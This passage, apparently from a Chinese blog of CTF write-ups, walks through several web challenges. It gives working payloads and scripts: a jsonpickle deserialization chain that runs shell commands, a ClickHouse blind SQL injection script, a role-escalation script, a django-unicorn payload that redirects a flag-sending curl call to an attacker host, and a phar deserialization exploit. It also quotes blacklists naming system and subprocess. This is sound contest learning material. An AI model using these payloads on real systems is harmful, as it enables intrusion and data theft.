__func__, __self__, pydoc, __module__, __dict__, __mro__, __subclasses__, __init__, __new__]# --- Web 应用程序防火墙 (WAF) ---def waf(serialized): 检查序列化后的 JSON 字符串中是否包含任何黑名单关键词。 try: # 先解析成 Python 字典，再重新导出为字符串进行检查 data = json.loads(serialized) payload = json.dumps(data, ensure_ascii=False) # WAF检查的是这个重新dump的字符串 for bad in FORBIDDEN: if bad in payload: return bad # 如果发现黑名单关键词，返回该关键词 return None # 未发现黑名单关键词 except: return error # JSON 解析失败或waf函数内部错误# --- 路由定义 ---@app.route(/)def root(): 根页面，显示index.html return render_template(index.html)@app.route(/register, methods=[GET, POST])def register(): 用户注册页面和处理 if request.method == POST: username = request.form.get(username) password = request.form.get(password) confirm_password = request.form.get(confirm_password) if not username or not password or not confirm_password: return render_template(register.html, error=所有字段都是必填的。) if password != confirm_password: return render_template(register.html, error=密码不匹配。) if len(username) 4 or len(password) 6: return render_template(register.html, error=用户名至少需要4个字符，密码至少需要6个字符。) if register_user(username, password): return render_template(index.html, message=注册成功！请登录。) else: return render_template(register.html, error=用户名已存在。) return render_template(register.html)@app.post(/auth)def auth(): 用户认证（登录）处理 u = request.form.get(u) p = request.form.get(p) for acc in users_db: if acc.uid == u and acc.pwd == p: # 认证成功，生成会话令牌 sess_data = Session(user: u, ts: int(time.time())) token_raw = jsonpickle.encode(sess_data) # 序列化Session对象 b64_token = base64.b64encode(token_raw.encode()).decode() # Base64编码 resp = make_response(登录成功。) resp.set_cookie(authz, b64_token) # 设置认证Cookie resp.status_code = 302 resp.headers[Location] = /panel # 重定向到面板页 return resp return render_template(index.html, error=登录失败。用户名或密码无效。)@app.route(/panel)def panel(): 用户面板页面 token = request.cookies.get(authz) if not token: return redirect(url_for(root, error=缺少Token。)) try: # Base64解码Token decoded = base64.b64decode(token.encode()).decode() except: return render_template(error.html, error=Token格式错误。) # WAF检查 ban = waf(decoded) if ban: return render_template(error.html, error=f请不要黑客攻击！ban) try: # 反序列化Session对象 # safe=True 参数旨在防止不安全的构造函数调用，但并非万能 sess_obj = jsonpickle.decode(decoded, safe=True) meta = sess_obj.meta # 根据用户权限显示不同面板 if meta.get(user) != admin: return render_template(user_panel.html, username=meta.get(user)) return render_template(admin_panel.html) except Exception as e: # 捕捉反序列化或处理过程中的异常 return render_template(error.html, error=f数据解码失败。)@app.route(/vault)def vault(): 金库页面（只有管理员能访问并查看Flag） token = request.cookies.get(authz) if not token: return redirect(url_for(root)) try: decoded = base64.b64decode(token.encode()).decode() # WAF检查 if waf(decoded): return render_template(error.html, error=请不要尝试黑客攻击！) # 反序列化Session对象 sess_obj = jsonpickle.decode(decoded, safe=True) meta = sess_obj.meta # 权限检查 if meta.get(user) != admin: return render_template(error.html, error=访问被拒绝。只有管理员才能查看此页面。) # 管理员专属，显示Flag flag = NepCTFfake_flag_this_is_not_the_real_one return render_template(vault.html, flag=flag) except: # 泛型异常捕获，重定向回根页 return redirect(url_for(root))@app.route(/about)def about(): 关于页面 return render_template(about.html)# --- 应用运行 ---if __name__ == __main__: app.run(host=0.0.0.0, port=8000, debug=False) 黑名单（哎哟我。。。 FORBIDDEN = [ builtins, os, system, repr, __class__, subprocess, popen, Popen, nt, code, reduce, compile, command, pty, platform, pdb, pickle, marshal, socket, threading, multiprocessing, signal, traceback, inspect, \\\\\\\\, posix, render_template, jsonpickle, cgi, execfile, importlib, sys, shutil, state, import, ctypes, timeit, input, open, codecs, base64, jinja2, re, json, file, write, read, globals, locals, getattr, setattr, delattr, uuid, __import__, __globals__, __code__, __closure__, __func__, __self__, pydoc, __module__, __dict__, __mro__, __subclasses__, __init__, __new__] 文章上所有已知的poc都被禁了 那么肯定就要自己想办法了 这里看的是lamentxu师傅的方法 直接清除黑名单 (暴力美学 赞 list对象有个方法 clear list.clear() 调用FORBIDDEN.clear()函数 就可以将FORBIDDEN列表清空了! POC: py/object: __main__.Session, meta: user: py/object:__main__.FORBIDDEN.clear,py/newargs: [],ts:1753790439 再使用 py/object: __main__.Session, meta: user: py/object:subprocess.getoutput,py/newargs: [/readflag /app/1.txt],ts:1753790439 再去读app1.txt py/object: __main__.Session,meta: user: py/object: subprocess.getoutput,py/newargs: [cat /app/1.txt], ts: 1753446254 我难道不是sql注入天才吗挺小众的clickhouse数据库 黑名单是preg_match(/select.*from|\\(|or|and|union|except/is,$id) 这里的脚本来源于群里baozongwi师傅提供的 使用了 INTERSECT 子句 https://clickhouse.com/docs/zh/sql-reference/statements/select/intersect INTERSECT 子句仅返回来自第一个和第二个查询的结果行。这两个查询必须匹配列数、顺序和类型。`INTERSECT` 的结果可以包含重复行。 --来源clickhouse官方文档 import requestsfrom collections import dequefrom urllib.parse import urlparseimport timeimport sysfrom urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)# --- 配置 ---URL = https://nepctf31-syh2-6rti-hovn-hn4xv8mjt033.nepctf.com:443CHARSET = 1234567890abcdefghijklmnopqrstuvwxyzNCTF-#CHARSET = string.ascii_lowercase + string.digits + ~`!@#$%^*()+-=[]\\|,.?/_#CHARSET = string.ascii_letters + string.digits + string.punctuation# 库#payload_template = id INTERSECT FROM system.databases AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age# 表# payload_template = id INTERSECT FROM system.tables AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age WHERE inject.database=nepnep# 名# payload_template = id INTERSECT FROM system.columns AS inject JOIN users ON inject.name LIKE pattern SELECT users.id, users.name, users.email, users.age WHERE inject.table=nepnep# flag# python test2.py NepCTFpayload_template = id INTERSECT FROM nepnep.nepnep AS inject JOIN users ON inject.`51@g_ls_h3r3` LIKE pattern SELECT users.id, users.name, users.email, users.ageHOSTNAME = urlparse(URL).hostnameHEADERS = Content-Type: application/x-www-form-urlencoded, Connection: keep-alive, Host: HOSTNAME# --- 核心检测函数 ---def check(prefix, exact_match=False): 发送盲注Payload，根据响应判断条件是否为真。 返回 True 代表条件成立 (服务器返回了内容)。 返回 False 代表条件不成立 (服务器未返回内容)。 # 根据是否精确匹配，决定LIKE语句的模式 like_pattern = prefix if exact_match else fprefix% # 使用我们之前讨论并确认有效的盲注Payload格式 # 这比你提供的HTTP请求中的原始payload更可靠，因为它能清晰地返回真/假两种状态 final_payload = payload_template.format(pattern=like_pattern) data = id: final_payload try: # 添加proxies参数并禁用SSL证书验证(verify=False)以配合代理工具 response = requests.post(URL, headers=HEADERS, data=data, timeout=15, verify=False) if User_5 in response.text: return True else: return False except requests.exceptions.RequestException as e: # 网络错误等异常情况，打印错误并返回False print(f [Error] Request failed for prefix prefix: e, file=sys.stderr) return False# --- 广度优先搜索 (BFS) 算法 ---def bfs_discover(start_prefix=): 使用广度优先搜索算法来发现所有表名。 可以从一个指定的前缀开始搜索。 print(--- [ 启动广度优先(BFS)注入脚本 ] ---) queue = deque() found_names = set() # 1. 初始化队列 if start_prefix: print(f [+] 从指定前缀 start_prefix 开始搜索...) # 检查提供的前缀是否有效 if check(start_prefix): print(f - 前缀 start_prefix 有效，将其添加到队列。) queue.append(start_prefix) # 检查提供的前缀本身是否就是一个完整的表名 if check(start_prefix, exact_match=True): if start_prefix not in found_names: print(f [!] 指定的前缀本身就是一个完整名: start_prefix ) found_names.add(start_prefix) else: print(f [-] 指定的前缀 start_prefix 无效或未返回任何结果。脚本终止。) return else: # 如果未指定前缀，则从单个字符开始探测 print( [+] 正在探测第一层前缀 (所有可能的起始字符)...) for char in CHARSET: if check(char): print(f - 发现有效起始字符: char) queue.append(char) # 检查单字符本身是否就是一个完整的表名 if check(char, exact_match=True): if char not in found_names: print(f [!] 发现完整表名: char ) found_names.add(char) if not queue: print( [-] 未发现任何有效的起始字符，请检查配置或目标状态。) return # 2. 开始逐层遍历 print( [+] 开始进行广度优先遍历...) # `level` 表示当前正在处理的前缀的长度 level = len(start_prefix) if start_prefix else 1 while queue: level_size = len(queue) print(f --- 正在处理长度为 level + 1 的前缀 (当前队列中有 level_size 个待扩展前缀) ---) if level_size == 0: break for _ in range(level_size): current_prefix = queue.popleft() # 3. 扩展当前前缀，生成下一层节点 for char in CHARSET: new_prefix = current_prefix + char # 检查新生成的前缀是否存在 if check(new_prefix): print(f - 发现有效前缀: new_prefix) queue.append(new_prefix) # 4. 检查该有效前缀是否同时也是一个完整的表名 if check(new_prefix, exact_match=True): if new_prefix not in found_names: print(f [!] 发现完整表名: new_prefix ) found_names.add(new_prefix) level += 1 time.sleep(0.5) # 适当暂停，避免对服务器造成过大压力 print( --- [ BFS遍历完成 ] ---) if found_names: print( [SUCCESS] 所有发现的表名:) for name in sorted(list(found_names)): print(f - name) else: print( [-] 未能发现任何完整的表名。)# --- 脚本主入口 ---if __name__ == __main__: # 从命令行参数获取可选的起始前缀 print(f用法: python sys.argv[0] [可选的起始前缀]) start_prefix = if len(sys.argv) 1: start_prefix = sys.argv[1] print(f [*] 检测到命令行参数，将使用 start_prefix 作为起始前缀进行搜索。) else: print( [*] 未提供起始前缀，将从头开始搜索所有表名。) bfs_discover(start_prefix)","tags":["CTF-wp"]},{"title":"CubeCTF 2025","path":"/2025/07/23/cubectf2025-web/","content":"复现平台:https://gz.imxbt.cn/games/27/challenges# WorkerDB注册和登录功能点apilogin 和 apiregister 随便注册进去看看 发现role是admin结合题目描述那我们目的就是成为admin 并且已知这个题是session进行role验证 这个题我尝试了flask-unsign爆破是不行的 那jwt这条路行不通 于是尝试dirsearch 扫描出admin路径 访问提示我Access denied，登陆进去有change attribute功能点 抓包抓到一个新路由apisettingsupdate 源码 from flask import Flask, redirect, render_template, request, jsonify, session, url_forfrom multiprocessing import Lockfrom functools import wrapsimport secretsimport sqlite3import jsonimport osapp = Flask(__name__)app.secret_key = secrets.token_hex(16)ALLOWED_ATTRIBUTES = role, email, display_name, theme, language, notifications, timezone, avatar, bio, website, locationdef init_db(): conn = sqlite3.connect(database.db) c = conn.cursor() c.execute( CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password TEXT NOT NULL, attributes TEXT NOT NULL ) ) c.execute(SELECT id FROM users WHERE username = ?, (admin,)) if not c.fetchone(): admin_attrs = json.dumps( role: admin, email: admin@example.com, display_name: Administrator ) admin_password = secrets.token_hex(16) c.execute(INSERT INTO users (username, password, attributes) VALUES (?, ?, ?), (admin, admin_password, admin_attrs)) print(created admin account with password:, admin_password) conn.commit() conn.close()def get_db(): conn = sqlite3.connect(database.db) conn.row_factory = sqlite3.Row return connl = Lock()def requires_auth(f): @wraps(f) def decorated(*args, **kwargs): if user_id not in session: return jsonify(error: Authentication required), 401 with l: return f(*args, **kwargs) return decorateddef has_xss(value): if not isinstance(value, str): return False return any(c in value for c in [, , , , (, ), , , =])@app.route(/api/register, methods=[POST])def api_register(): try: data = request.get_json() if not data: return jsonify(error: Invalid request), 400 username = data.get(username) password = data.get(password) if not username or not password: return jsonify(error: Invalid credentials), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT id FROM users WHERE username = ?, (username,)) if cursor.fetchone(): db.close() return jsonify(error: Username already exists), 400 attributes = json.dumps( role: user, email: , display_name: username, theme: light ) cursor.execute(INSERT INTO users (username, password, attributes) VALUES (?, ?, ?), (username, password, attributes)) db.commit() db.close() return jsonify(message: Registration successful) except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/login, methods=[POST])def api_login(): try: data = request.get_json() if not data: return jsonify(error: Invalid request), 400 username = data.get(username) password = data.get(password) if not username or not password: return jsonify(error: Invalid credentials), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT id, attributes FROM users WHERE username = ? AND password = ?, (username, password)) user = cursor.fetchone() db.close() if user: attrs = json.loads(user[attributes]) session[user_id] = user[id] session[role] = attrs.get(role) return jsonify(message: Login successful) return jsonify(error: Invalid credentials), 401 except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/settings/update, methods=[POST])@requires_authdef update_settings(): try: user_id = session[user_id] new_attrs = request.get_json() if not new_attrs: return jsonify(error: Invalid input), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) temp_attrs = current_attrs.copy() for key in new_attrs: if key in current_attrs: temp_attrs[key] = None cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(temp_attrs), user_id)) db.commit() sanitized_attrs = for key, value in new_attrs.items(): if key in ALLOWED_ATTRIBUTES: if not has_xss(value): sanitized_attrs[key] = value cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) final_attrs = current_attrs.copy() for key, value in sanitized_attrs.items(): final_attrs[key] = value final_attrs[role] = user cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(final_attrs), user_id)) db.commit() db.close() return jsonify(message: Settings updated successfully) except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/manage/permissions, methods=[POST])@requires_authdef manage_permissions(): try: user_id = session[user_id] data = request.get_json() if not data or target_user not in data or new_role not in data: return jsonify(error: Missing required fields), 400 target_username = data[target_user] new_role = data[new_role] db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) user_data = cursor.fetchone() current_user_attrs = json.loads(user_data[attributes]) if current_user_attrs.get(role) != user: cursor.execute(SELECT id, attributes FROM users WHERE username = ?, (target_username,)) target_user = cursor.fetchone() if not target_user: db.close() return jsonify(error: Target user not found), 404 target_attrs = json.loads(target_user[attributes]) target_attrs[role] = new_role cursor.execute(UPDATE users SET attributes = ? WHERE username = ?, (json.dumps(target_attrs), target_username)) db.commit() db.close() return jsonify(message: Permissions updated successfully) db.close() return jsonify(error: Access denied), 403 except sqlite3.Error: return jsonify(error: Server error), 500@app.route(/api/admin, methods=[GET])@requires_authdef admin_panel(): try: user_id = session[user_id] db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) user_data = cursor.fetchone() db.close() attrs = json.loads(user_data[attributes]) if attrs.get(role) == admin: return jsonify( message: Welcome to the admin panel, flag: os.getenv(FLAG, cubeexample_flag) ) return jsonify(error: Access denied), 403 except sqlite3.Error: return jsonify(error: Server error), 500@app.get(/admin)def admin(): if session.get(user_id): return render_template(admin.html) return redirect(url_for(index))@app.get(/login)def login(): return render_template(login.html)@app.get(/register)def register(): return render_template(register.html)@app.get(/)def index(): if session.get(user_id): db = get_db() cursor = db.cursor() cursor.execute(SELECT username, attributes FROM users WHERE id = ?, (session[user_id],)) user = cursor.fetchone() db.close() return render_template(home.html, user=user[0], attributes=json.loads(user[1]), allowed_attrs=ALLOWED_ATTRIBUTES) return render_template(index.html)init_db() 最主要是apisettingsupdate 这里有可以利用的的东西 接口先提交清空字段的数据库更新，再处理并校验输入，当输入类型异常导致后续逻辑中断时，敏感字段（如 role）被永久清空而未恢复，触发权限检查逻辑缺陷。所以当我们传入[“role”] 就成功设置role为none @app.route(/api/settings/update, methods=[POST])@requires_authdef update_settings(): try: user_id = session[user_id] new_attrs = request.get_json() if not new_attrs: return jsonify(error: Invalid input), 400 db = get_db() cursor = db.cursor() cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) temp_attrs = current_attrs.copy() for key in new_attrs: if key in current_attrs: temp_attrs[key] = None cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(temp_attrs), user_id)) db.commit() sanitized_attrs = for key, value in new_attrs.items(): if key in ALLOWED_ATTRIBUTES: if not has_xss(value): sanitized_attrs[key] = value cursor.execute(SELECT attributes FROM users WHERE id = ?, (user_id,)) current_attrs = json.loads(cursor.fetchone()[attributes]) final_attrs = current_attrs.copy() for key, value in sanitized_attrs.items(): final_attrs[key] = value final_attrs[role] = user cursor.execute(UPDATE users SET attributes = ? WHERE id = ?, (json.dumps(final_attrs), user_id)) db.commit() db.close() return jsonify(message: Settings updated successfully) except sqlite3.Error: return jsonify(error: Server error), 500 因为apimanagepermissions只校验是不是为user 不是user就通过 我们none 所以可以通过伪造admin if current_user_attrs.get(role) != user: cursor.execute(SELECT id, attributes FROM users WHERE username = ?, (target_username,)) target_user = cursor.fetchone() 于是脚本是: import requestsBASE = http://gz.imxbt.cn:20580/s = requests.Session()s.post(BASE + /api/register, json= username: sauy, password: 122)s.post(BASE + /api/login, json= username: sauy, password: 122)r = s.post( BASE + /api/settings/update, json=[role], headers=Content-Type: application/json)print(Step 3 status:, r.status_code)r = s.post(BASE + /api/manage/permissions, json= target_user: sauy, new_role: admin)print(Step 4 promote:, r.status_code, r.json())r = s.get(BASE + /api/admin)print(Step 5 flag:, r.status_code, r.json()) legal snacks题目描述(中文版) 我们找到了这个合法的网站，它正在销售与黑客相关的零食，但它们的一款产品定价奇怪。找出一种方法在不支付的情况下购买它。 进去就是一个类似于购物网站的东西 往下看看的个价格很离谱的东西 肯定就是要买它 余额只有100 那就想办法能不能把购买数量改为负数 前端直接改不行 抓个包看看呢 成功 那就凑到不超过100就行了 满足要求后购买 卡号要求16位全数字 todo其他的我不啰嗦了 前面的也就是输入字符限制20个字符 抓包看个传入格式为 id:7jqvVCJD,data:task:,tasks:[],checksum:Scdr22XG,actionQueue:[type:syncInput,payload:name:task,value:test1,partials:[],type:callMethod,payload:name:add,partials:[]],epoch:1753276792384,hash:3667ovLi 本题可知是django框架 考点是CVE-2025-24370 https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43 附件里面很重要的源码 如果攻击者能够修改 settings.CONTACT_URL（例如通过序列化注入、配置修改、数据库注入等），就能将 curl 的目标指向攻击者自己的服务器。 def home(request): # todo charge users $49.99/month because greed # todo dont send the confidential flag ... system(fcurl settings.CONTACT_URL -d @/tmp/flag.txt -X GET -o /dev/null) return render(request, findex.html) poc是 type: syncInput, payload: name: __init__.__globals__.sys.modules.django.template.backends.django.settings.CONTACT_URL, value: http://your-ip:port 最后发包 POST /unicorn/message/todo HTTP/1.1Host: gz.imxbt.cn:20622Content-Length: 691Accept: application/jsonX-Requested-With: XMLHttpRequestX-CSRFTOKEN: OaW6pVSwc7zWaWovIsxPogO3TESlFCY0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36Content-Type: text/plain;charset=UTF-8Origin: http://gz.imxbt.cn:20622Referer: http://gz.imxbt.cn:20622/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: csrftoken=OaW6pVSwc7zWaWovIsxPogO3TESlFCY0Connection: close id: n6m7PYbo, data: task: , tasks: [] , checksum: PXafcTdS, actionQueue: [ type: syncInput, payload: name: task, value: 12 , partials: [] , type: syncInput, payload: name: __init__.__globals__.sys.modules.django.template.backends.django.settings.CONTACT_URL, value: http://123:123 , partials: [] , type: callMethod, payload: name: add , partials: [] ], epoch: 1753284343529, hash: djXgQjG4 先服务器开始监听 然后发包 再去网页刷新就可以拿到flag了","tags":["CTF-wp"]},{"title":"关于gc回收机制在phar序列化的一次例题","path":"/2025/07/22/NSSCTF prize_p1/","content":"NSSCTF prize_p1META http-equiv=Content-Type content=text/html; charset=utf-8 /?phphighlight_file(__FILE__);class getflag function __destruct() echo getenv(FLAG); class A public $config; function __destruct() if ($this-config == w) $data = $_POST[0]; if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $data)) die(我知道你想干吗，我的建议是不要那样做。); file_put_contents(./tmp/a.txt, $data); else if ($this-config == r) $data = $_POST[0]; if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $data)) die(我知道你想干吗，我的建议是不要那样做。); echo file_get_contents($data); if (preg_match(/get|flag|post|php|filter|base64|rot13|read|data/i, $_GET[0])) die(我知道你想干吗，我的建议是不要那样做。);unserialize($_GET[0]);throw new Error(那么就从这里开始起航吧); 思路分析:有两个类 A是读取flag B是可以进行文件读写的功能 那我们通过上传phar文件再利用phar协议来读取 但是phar文件是明文 含有getflag也会被过滤 那就使用gzip打包 phar伪协议一样可以解析gzip bzip2 tar zip这四个后缀的文件 生成phar文件记得phar only设置为off 并且这里php环境使用的和题目环境一样的php5 ?phphighlight_file(__FILE__); class getflag $phar = new Phar(test.phar);$phar-startBuffering();$phar-setStub(?php __HALT_COMPILER(); ?);$o = new getflag();$o = array(0=$o,1=null);$phar-setMetadata($o);$phar-addFromString(test.txt, test);$phar-stopBuffering(); 那么这里生成的phar文件我们需要绕过throw new Error(“那么就从这里开始起航吧”); 这里就运用到了gc回收机制 修改phar文件 将1替换为0 a:2:i:0;O:7:getflag:i:0;N; Array[0]首先是设置为getflag对象的，然后又将Array[0]赋值为NuLL，那么原来的getflag就没有被引用了 触发了gc回收机制 __destruct被提前触发 重新签名修改过后的phar文件需要重新签名 from hashlib import sha1f = open(./test.phar, rb).read() # 修改内容后的phar文件s = f[:-28] # 获取要签名的数据h = f[-8:] # 获取签名类型以及GBMB标识newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMBopen(ph2.phar, wb).write(newf) # 写入新文件 读取flag然后上传文件进行读取操作 import requestsimport reimport gzipurl = http://node4.anna.nssctf.cn:28318/### 先将phar文件变成gzip文件with open(./ph2.phar, rb) as f1: phar_zip = gzip.open(gzip.zip, wb) # 创建了一个gzip文件的对象 phar_zip.writelines(f1) # 将phar文件的二进制流写入 phar_zip.close()###写入gzip文件with open(gzip.zip, rb) as f2: data1 = 0: f2.read() # 利用gzip后全是乱码绕过 param1 = 0: O:1:A:1:s:6:config;s:1:w; p1 = requests.post(url=url, params=param1, data=data1)### 读gzip.zip文件，获取flagparam2 = 0: O:1:A:1:s:6:config;s:1:r;data2 = 0: phar://tmp/a.txtp2 = requests.post(url=url, params=param2, data=data2)flag = re.compile(NSSCTF\\.*?\\).findall(p2.text)print(flag)","tags":["CTF-wp"]},{"title":"Basectf2024-web","path":"/2025/07/09/BaseCTF2024-WEB/","content":"数学大师经典request脚本题 正则ai就行 注意点就是把×替换为* ÷替换为 并且开启session cookie 因为判断连续正确依靠cookie import reimport requestsurl = http://gz.imxbt.cn:20429/sess=requests.session()sess.cookies.set(PHPSESSID, d5nu0bl94l91naj2i7heme44vu)response = sess.get(url)count = 0for i in range(50): match = re.search(r(\\d+)\\s*([+\\-\\*/×÷])\\s*(\\d+), response.text) a, op, b = match.groups() if op == ×: op = * if op == ÷: op = // expr = faopb answer = eval(expr) print(f第i + 1题: expr = answer) response = sess.post(url, data=answer: str(answer)) count += 1 if count == 50: print(response.text) flag:BaseCTFf93114a9-c1ea-41a7-b05a-d2bb8e32a9ed 玩原神玩的php审计题 ?phphighlight_file(__FILE__);error_reporting(0);include flag.php;if (sizeof($_POST[len]) == sizeof($array)) ys_open($_GET[tip]); else die(错了！就你还想玩原神？❌❌❌);function ys_open($tip) if ($tip != 我要玩原神) die(我不管，我要玩原神！😭😭😭); dumpFlag();function dumpFlag() if (!isset($_POST[m]) || sizeof($_POST[m]) != 2) die(可恶的QQ人！😡😡😡); $a = $_POST[m][0]; $b = $_POST[m][1]; if(empty($a) || empty($b) || $a != 100% || $b != love100% . md5($a)) die(某站崩了？肯定是某忽悠干的！😡😡😡); include flag.php; $flag[] = array(); for ($ii = 0;$ii sizeof($array);$ii++) $flag[$ii] = md5(ord($array[$ii]) ^ $ii); echo json_encode($flag); 第一步就是比较len数组的长度是否和flag的长度相同，爆破即可传参 GET:?tip=我要玩原神 POST:len[0]=1len[1]=1len[2]=1len[3]=1len[4]=1len[5]=1len[6]=1len[7]=1len[8]=1len[9]=1len[10]=1len[11]=1len[12]=1len[13]=1len[14]=1len[15]=1len[16]=1len[17]=1len[18]=1len[19]=1len[20]=1len[21]=1len[22]=1len[23]=1len[24]=1len[25]=1len[26]=1len[27]=1len[28]=1len[29]=1len[30]=1len[31]=1len[32]=1len[33]=1len[34]=1len[35]=1len[36]=1len[37]=1len[38]=1len[39]=1len[40]=1len[41]=1len[42]=1len[43]=1len[44]=1 第二步很简单字面意思 GET不变 POST:len[0]=1len[1]=1len[2]=1len[3]=1len[4]=1len[5]=1len[6]=1len[7]=1len[8]=1len[9]=1len[10]=1len[11]=1len[12]=1len[13]=1len[14]=1len[15]=1len[16]=1len[17]=1len[18]=1len[19]=1len[20]=1len[21]=1len[22]=1len[23]=1len[24]=1len[25]=1len[26]=1len[27]=1len[28]=1len[29]=1len[30]=1len[31]=1len[32]=1len[33]=1len[34]=1len[35]=1len[36]=1len[37]=1len[38]=1len[39]=1len[40]=1len[41]=1len[42]=1len[43]=1len[44]=1m[0]=100%25m[1]=love100%2530bd7ce7de206924302499f197c7a966 %记得url编码 得到列表 最后一步ai给你写个还原脚本就好 import hashlibmd5_list = [ 3295c76acbf4caaed33c36b1b5fc2cb1,26657d5ff9020d2abefe558796b99584,73278a4a86960eeb576a8fd4c9ec6997, ec8956637a99787bd197eacd77acce5e,e2c420d928d4bf8ce0ff2ec19b371514,43ec517d68b6edd3015b3edc9a11367b, ea5d2f1c4608232e07d3aa3d998e5135,c8ffe9a587b126f152ed3d89a146b445,2723d092b63885e0d7c260cc007e8b9d, 2723d092b63885e0d7c260cc007e8b9d,c9e1074f5b3f9fc8ea15d152add07294,c9e1074f5b3f9fc8ea15d152add07294, f0935e4cd5920aa6c7c996a5ee53a70f,65b9eea6e1cc6bb9f0cd2a47751a186f,03afdbd66e7929b125f8597834fa83a4, 44f683a84163b3523afe57c2e008bc8c,7f39f8317fbdb1988ef4c628eba02591,d67d8ab4f4c10bf22aa353e27879133c, 6364d3f0f495b6ab9dcf8d3b5c6e0b01,a5771bce93e200c36f7cd9dfd0e5deaa,6c8349cc7260ae62e3b1396831a8398f, 9f61408e3afb633e50cdf1b20de6f466,e369853df766fa44e1ed0ff613f563bd,d67d8ab4f4c10bf22aa353e27879133c, a0a080f42e6f13b3a2df133f073095dd,c8ffe9a587b126f152ed3d89a146b445,b53b3a3d6ab90ce0268229151c9bde11, e369853df766fa44e1ed0ff613f563bd,6c8349cc7260ae62e3b1396831a8398f,4c56ff4ce4aaf9573aa5dff913df997a, d645920e395fedad7bbbed0eca3fe2e0,c0c7c76d30bd3dcaefc96f40275bdc0a,1ff1de774005f8da13f42943881c655f, 8e296a067a37563370ded05f5a3bf3ec,7cbbc409ec990f19c78c75bd1e06f215,6f4922f45568161a8cdf4ad2299f6d23, 1f0e3dad99908345f7439f8ffabdffc4,a3f390d88e4c41f2747bfa2f1b5f87db,3295c76acbf4caaed33c36b1b5fc2cb1, 735b90b4568125ed6c3f678819b6e058,c74d97b01eae257e44aa9d5bade97baf,6ea9ab1baa0efb9e19094440c317e21b, 4e732ced3463d06de0ca9a15b6153677,33e75ff09dd601bbe69f351039152189,43ec517d68b6edd3015b3edc9a11367b]def md5_str(s: str) - str: return hashlib.md5(s.encode()).hexdigest()flag_chars = []for i, target_md5 in enumerate(md5_list): found = False for c in range(32, 127): # 常见可打印字符ASCII范围 val = c ^ i val_str = str(val) if md5_str(val_str) == target_md5: flag_chars.append(chr(c)) found = True break if not found: flag_chars.append(?)flag = .join(flag_chars)print(还原的flag:, flag) flag:BaseCTFedbcfd11-6259-40be-91d6-88d17add8407 1z_php?phphighlight_file(index.php);# 我记得她...好像叫flag.php吧？$emp=$_GET[e_m.p];$try=$_POST[try];if($emp!=114514intval($emp,0)===114514) for ($i=0;$istrlen($emp);$i++) if (ctype_alpha($emp[$i])) die(你不是hacker？那请去外场等候！); echo 只有真正的hacker才能拿到flag！.br; if (preg_match(/.+?HACKER/is,$try)) die(你是hacker还敢自报家门呢？); if (!stripos($try,HACKER) === TRUE) die(你连自己是hacker都不承认，还想要flag呢？); $a=$_GET[a]; $b=$_GET[b]; $c=$_GET[c]; if(stripos($b,php)!==0) die(收手吧hacker，你得不到flag的！); echo (new $a($b))-$c();else die(114514到底是啥意思嘞？。？);# 觉得困难的话就直接把shell拿去用吧，不用谢~$shell=$_POST[shell];eval($shell);? 第一个intval特性 ,传参还考了一个php非法传参,e[m.p=114514,即可 第二步 绕过正则并且不满足!stripos($try,HACKER) === TRUE,当我们传入tryHACKER的时候，会输出你连自己是hacker都不承认，还想要flag呢？ 绕不过 使用最大正则回溯 最后 (new $a($b))-$c() 很明显的php使用原生类读文件 import requestsurl = (http://gz.imxbt.cn:20693/ ?e[m.p=114514.1 a=SplFileObject b=php://filter/read=convert.base64-encode/resource=flag.php c=__toString)data = try: f * 1000001 + HACKERres = requests.post(url=url, data=data)print(res.text) flag:BaseCTF07e8680b-b866-4d95-a053-20f723b24c06 A Dark Room签到题 ctrl+u即得 Aura 酱的礼物简单的伪协议和ssrf绕过 POST：pen=data://text/plain,Aurachallenge=http://jasmineaura.github.io@127.0.0.1gift=php://filter/convert.base64-encode/resource=flag.php flag:BaseCTFe996ff9f-4941-4247-a168-e9aa94e6fd8b Back to the future进去都没有 看看有无robots.txt 有 User-agent: *Disallow: /.git 直白的git泄露 使用git-dumper https://github.com/arthaud/git-dumper python3 git_dumper.py http://gz.imxbt.cn:20805/.git/ ./basectf 拉下来发现只有一个README.md,内容是 # My WebsiteThis is my web project.Oops, I place flag here, but i deleted it! 于是我们去查看log 即可得到flag flag:BaseCTF1aa62024-5a12-4f55-80fa-cb9c41e1154b HTTP 是什么呀签到题 POST /?basectf=we1c%2500me HTTP/1.1Host: gz.imxbt.cn:20807Content-Type: application/x-www-form-urlencodedUser-Agent: BaseCookie: c00k13=i cant eat itReferer: BaseX-Forwarded-For: 127.0.0.1Base=fl@g 然后有一个重定向,抓跳转一瞬间的包就行，response里有flag的base64编码 Jinja Mark首先进入界面提示了index和flag路由 flag路由进去猜幸运数字 爆破就行 